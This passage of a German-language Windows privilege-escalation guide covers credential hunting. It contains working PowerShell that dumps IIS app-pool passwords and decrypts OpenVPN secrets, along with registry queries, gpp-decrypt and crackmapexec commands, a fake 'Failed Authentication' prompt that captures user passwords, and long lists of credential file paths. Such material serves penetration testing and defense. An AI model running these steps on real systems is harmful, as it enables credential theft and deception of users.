        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installer werden **mit SYSTEM-Berechtigungen ausgeführt**. Viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Zugangsdaten-Artefakte in Support-Tool-Registrys

Einige ältere Remote-Support-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln bei. So bezeichnete `SecurityPasswordAES` von TeamViewer laut der [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Marker im Wertnamen ist lediglich ein Hinweis für die Überprüfung: Prüfen Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und für dieses Konto eine entsprechende Berechtigung besteht. Nehmen Sie Chiffretext und wiederhergestellte Passwörter nicht in routinemäßige Enumerierungsausgaben auf.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn vermutet wird, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und keine Sicherheitsfunktion ist; für sich genommen bedeutet er nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, bei breit angelegter Enumerierung mögliche Geheimnisse auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Rechte besitzt; prüfen Sie die tatsächlichen Daten und die aktuellen Kontorechte separat.

### Von CI-Servern aufbewahrte Änderungspatches

Ein CI-Server kann eingereichte Quellcodeänderungen nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Remote-Run-Änderungen; das Datenverzeichnis kann konfiguriert sein und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Zugangsdatendatei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Beispielsweise benötigt ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfen Sie zunächst nur zugängliche Patchnamen und untersuchen Sie anschließend relevante Inhalte mit entsprechender Autorisierung, ohne bei routinemäßiger Enumerierung Geheimnisse auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Rechten. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen aufzunehmen.

### Benutzerdefinierte Rotation lokaler Administratorpasswörter

Ein selbst entwickelter Passwort-Rotator speichert möglicherweise ein verschlüsseltes lokales Administratorpasswort in einem lokalen Dienst, während die Zugangsdaten für dessen Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei liegen. Prüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein ausschließlich an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten dennoch erreichbar; die Authentifizierung allein beweist jedoch nicht, dass er die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go's [`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Passworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallszahlen ungeeignet ist. Vergewissern Sie sich, dass ein wiederhergestelltes Passwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Eskalationspfad betrachten. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob beweist keine dieser Voraussetzungen. Nehmen Sie Passwörter und Schlüsselmaterial nicht in routinemäßige Enumerierungsausgaben auf.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorpasswörter. Dessen Verzeichnis- oder Entra-gestützter Speicher und Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; ebenso bestimmen [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/), ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und wiederverwendete Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers verteilt. Ein lesbares benutzerdefiniertes Plugin kann eine Konfiguration oder Bytecode mit eingebetteten Dienstzugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und nehmen Sie wiederhergestellte Geheimnisse nicht in routinemäßige Enumerierungsausgaben auf. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Rechten, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die ACLs der relevanten Dateien und ersetzen Sie wiederverwendete Zugangsdaten durch separate Geheimnisse. Informationen zur Verzeichnisstruktur finden Sie in der [Installationsanleitung für Plugins von PaperMC](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank speichert möglicherweise `openfire.script` unter `Openfire\embedded-db`. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Die [Dokumentation des Openfire-Benutzerproviders](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) besagt, dass Passwörter im Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt werden können. Ein wiederhergestelltes Passwort ist nur dann für eine Rechteausweitung relevant, wenn es noch für eine privilegiertere Identität gültig ist; der Dateiname allein beweist weder Leseberechtigung noch die Wiederverwendung von Zugangsdaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Nehmen Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßige Enumerierungsausgaben auf.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Admin-Konsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole üblicherweise an Loopback; ein lokales Konto kann die Adresse trotzdem erreichen, wenn der Listener aktiv ist. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Dienstidentität von Openfire. Ein Administrator, der ein Plugin installieren kann, kann dazu führen, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann weitreichende Rechte bedeuten, wenn der Dienst als LocalSystem läuft. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein beweist weder den Zugriff auf die Admin-Konsole noch die Codeausführung. Weitere Informationen finden Sie in der [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und in der [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des Forensik-Verwaltungsservers

Velociraptor-Serverkonfigurationen, üblicherweise `server.config.yaml` genannt, können den `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit geringeren Rechten diesen Schlüssel lesen kann, ist er möglicherweise in der Lage, ein API-Clientzertifikat auszustellen. Ob dies zu höheren Rechten führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. In manchen Bereitstellungen bleibt der private CA-Schlüssel offline, sodass eine lesbare Serverkonfiguration möglicherweise keinen Signierschlüssel enthält.

Prüfen Sie auf einem Windows-Server die ACL der **Server**-Konfiguration in dessen Installationsverzeichnis sowie etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den für den Dienst konfigurierten Pfad, falls dieser abweicht. Bestätigen Sie, dass die aktuelle Identität die Datei lesen kann und dass `CA.private_key` tatsächlich enthalten ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumerierungsausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; erforderlich ist jedoch auch eine wirksame serverseitige Rolle. Diese zu erstellen oder zu ändern kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen möglichen Weg bieten, selbst wenn solche Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im entsprechenden Server- oder Agentenkontext und können daher weitreichende Rechte haben.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signierschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen sowie den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Zugangsdaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. Der [Export-Leitfaden von SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; das [Support-Forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfe zuerst die Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät nicht das dazugehörige Passwort und beweist weder, dass gespeicherte Anmeldedaten noch gültig sind, noch dass sie höhere Berechtigungen gewähren.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich darin etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Booten automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Backups

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch Offline-Hives von `SAM`, `SECURITY` und `SYSTEM` enthalten. Priorisieren Sie lokal zugängliche Backup- oder Image-Verzeichnisse und prüfen Sie die **Mitgliedsnamen** eines Images, bevor Sie etwas extrahieren. Ein `.wim`-Dateiname allein beweist nicht, dass Hives offengelegt werden; routinemäßige `install.wim`-, `boot.wim`- und Recovery-Images führen häufig auf eine falsche Fährte. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn sie im Scope liegt. Siehe Microsofts [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern eingerichtet werden konnten. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien mit einem nicht leeren Feld „cpassword“ durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und unterstützt so die Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Mit crackmapexec Passwörter abrufen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für eine web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem über HTTP bereitgestellten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du von einer Offenlegung ausgehst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass das Archiv ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den **Benutzer immer nach seinen Zugangsdaten oder sogar nach den Zugangsdaten eines anderen Benutzers fragen**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder als **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Variante mit Dateinamensliste ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password-Safe-v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachte einen passenden Dateinamen als möglichen Hinweis auf einen verschlüsselten Tresor; sein Vorhandensein bedeutet nicht, dass du ihn lesen, entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Überprüfung der Speicherorte solcher Dateien zugängliche Benutzerprofile und konfigurierte Freigabewurzeln.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldateien oder Kontofaktoren. Findet eine autorisierte Überprüfung in einem Eintrag ein LM:NT-Hash-Paar, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag verleiht für sich genommen keine Administrator- oder SYSTEM-Rechte; auch der Remote-Dienstzugriff, die Kontorechte und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Die Inventarisierung sollte den Pfad und die Lesbarkeit des Tresors angeben, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Variante des Search-Befehls ohne die Password Safe-Erweiterung

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

